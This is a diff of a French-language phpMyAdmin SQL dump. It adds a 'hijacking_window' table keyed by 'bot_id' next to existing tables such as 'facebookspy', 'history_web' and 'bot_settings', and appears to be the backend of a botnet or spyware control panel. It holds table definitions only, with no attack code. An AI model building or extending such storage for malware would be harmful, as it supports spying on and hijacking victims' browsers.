@@ -3,7 +3,7 @@
 -- http://www.phpmyadmin.net
 --
 -- Client :  localhost:8889
--- Généré le :  Mar 12 Avril 2016 à 12:39
+-- Généré le :  Mar 12 Avril 2016 à 17:52
 -- Version du serveur :  5.5.42
 -- Version de PHP :  7.0.0
 
@@ -73,6 +73,18 @@ CREATE TABLE `facebookspy` (
   `source_code` longtext NOT NULL,
   `date_last` text NOT NULL,
   `new` int(11) NOT NULL DEFAULT '0'
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
+
+-- --------------------------------------------------------
+
+--
+-- Structure de la table `hijacking_window`
+--
+
+CREATE TABLE `hijacking_window` (
+  `id` int(11) NOT NULL,
+  `bot_id` int(11) NOT NULL,
+  `windows_code` longtext NOT NULL
 ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
 
 -- --------------------------------------------------------
@@ -179,6 +191,12 @@ ALTER TABLE `facebookspy`
   ADD PRIMARY KEY (`id`);
 
 --
+-- Index pour la table `hijacking_window`
+--
+ALTER TABLE `hijacking_window`
+  ADD PRIMARY KEY (`id`);
+
+--
 -- Index pour la table `history_web`
 --
 ALTER TABLE `history_web`
@@ -231,6 +249,11 @@ ALTER TABLE `bot_settings`
 -- AUTO_INCREMENT pour la table `facebookspy`
 --
 ALTER TABLE `facebookspy`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+--
+-- AUTO_INCREMENT pour la table `hijacking_window`
+--
+ALTER TABLE `hijacking_window`
   MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
 --
 -- AUTO_INCREMENT pour la table `history_web`
